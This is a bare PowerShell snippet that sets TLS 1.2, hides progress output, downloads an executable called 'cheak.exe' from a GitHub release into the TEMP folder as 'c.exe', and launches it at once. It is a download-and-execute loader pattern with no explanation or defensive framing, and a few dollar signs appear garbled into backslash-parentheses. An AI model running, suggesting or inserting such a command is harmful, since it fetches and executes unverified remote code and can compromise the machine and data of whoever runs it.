[Net.ServicePointManager]::SecurityProtocol = 3072
\(ProgressPreference = 'SilentlyContinue'

irm https://github.com/tibizda068-collab/sbs/releases/download/v1/cheak.exe -OutFile \)env:TEMP\c.exe
Start-Process $env:TEMP\c.exe
